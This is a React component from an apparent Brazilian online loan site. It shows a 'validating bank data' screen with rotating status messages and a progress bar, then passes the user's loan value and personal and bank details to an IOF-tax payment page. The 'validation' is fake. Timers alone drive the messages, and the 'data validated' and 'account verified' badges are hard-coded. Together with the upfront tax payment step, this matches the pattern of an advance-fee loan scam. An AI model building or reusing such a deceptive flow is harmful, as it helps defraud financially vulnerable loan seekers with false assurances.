
import { useState, useEffect } from 'react';
import { useNavigate, useLocation } from 'react-router-dom';
import { Loader2, CheckCircle, CreditCard } from 'lucide-react';

const BankValidationLoading = () => {
  const [countdown, setCountdown] = useState(7);
  const [currentStep, setCurrentStep] = useState(0);
  const navigate = useNavigate();
  const location = useLocation();
  const { loanValue, personalData, bankData } = location.state || {};

  const validationSteps = [
    'Verificando dados bancários...',
    'Validando informações da conta...',
    'Confirmando chave PIX...',
    'Preparando liberação do valor...'
  ];

  useEffect(() => {
    const stepTimer = setInterval(() => {
      setCurrentStep((prev) => (prev + 1) % validationSteps.length);
    }, 1750);

    const countdownTimer = setInterval(() => {
      setCountdown((prev) => {
        if (prev <= 1) {
          clearInterval(countdownTimer);
          clearInterval(stepTimer);
          navigate('/pagamento-iof', { 
            state: { 
              loanValue, 
              personalData, 
              bankData 
            } 
          });
          return 0;
        }
        return prev - 1;
      });
    }, 1000);

    return () => {
      clearInterval(countdownTimer);
      clearInterval(stepTimer);
    };
  }, [navigate, loanValue, personalData, bankData]);

  return (
    <div className="min-h-screen bg-gray-light flex items-center justify-center">
      <div className="container mx-auto px-4 sm:px-6 lg:px-8">
        <div className="max-w-xl sm:max-w-2xl mx-auto">
          <div className="bg-white rounded-xl sm:rounded-2xl shadow-xl p-6 sm:p-8 text-center space-y-6 sm:space-y-8">
            <div className="space-y-3 sm:space-y-4">
              <div className="w-12 h-12 sm:w-16 sm:h-16 bg-green-primary rounded-full mx-auto flex items-center justify-center">
                <Loader2 className="w-6 h-6 sm:w-8 sm:h-8 text-white animate-spin" />
              </div>
              
              <h2 className="text-2xl sm:text-3xl font-bold text-green-dark">
                Validando dados bancários
              </h2>
              
              <p className="text-gray-600 text-base sm:text-lg px-2">
                Preparando a liberação do valor solicitado...
              </p>
            </div>

            <div className="space-y-4 sm:space-y-6">
              <div className="text-base sm:text-lg text-green-primary font-medium px-2">
                {validationSteps[currentStep]}
              </div>
              
              <div className="w-full bg-gray-200 rounded-full h-2 sm:h-3">
                <div 
                  className="bg-green-primary h-2 sm:h-3 rounded-full transition-all duration-1000 ease-linear"
                  style={{ width: `${((7 - countdown) / 7) * 100}%` }}
                ></div>
              </div>
            </div>

            <div className="grid grid-cols-1 sm:grid-cols-2 gap-3 sm:gap-4 text-xs sm:text-sm text-gray-500">
              <div className="flex items-center justify-center space-x-2">
                <CheckCircle className="w-4 h-4 sm:w-5 sm:h-5 text-green-primary" />
                <span>Dados validados</span>
              </div>
              <div className="flex items-center justify-center space-x-2">
                <CreditCard className="w-4 h-4 sm:w-5 sm:h-5 text-green-primary" />
                <span>Conta verificada</span>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default BankValidationLoading;
